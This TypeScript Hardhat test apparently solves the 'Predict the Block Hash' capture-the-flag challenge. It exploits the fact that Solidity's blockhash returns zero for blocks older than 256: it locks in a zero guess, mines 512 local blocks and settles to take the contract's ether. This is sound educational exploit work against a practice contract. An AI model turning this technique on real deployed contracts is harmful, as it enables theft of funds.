import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {

    /* The key to this challenge is that the blockhash function returns zero when blocknumber is not one of the most recent 256 blocks. See documentation: https://docs.soliditylang.org/_/downloads/en/latest/pdf/
    */



    const beforeBlockNumber = await ethers.provider.getBlockNumber();

    console.log('current block number: ', beforeBlockNumber);

    await target.lockInGuess('0x0000000000000000000000000000000000000000000000000000000000000000', { value: utils.parseEther('1') });

    // console.log('locked in guess: ', await target.guess());

    // mine 256 blocks twice
    await network.provider.send("hardhat_mine", ["0x100"]);
    await network.provider.send("hardhat_mine", ["0x100"]);

    await target.settle();

    const afterBlockNumber = await ethers.provider.getBlockNumber();

    console.log('new block number: ', afterBlockNumber);

    expect(await target.isComplete()).to.equal(true);
  });
});
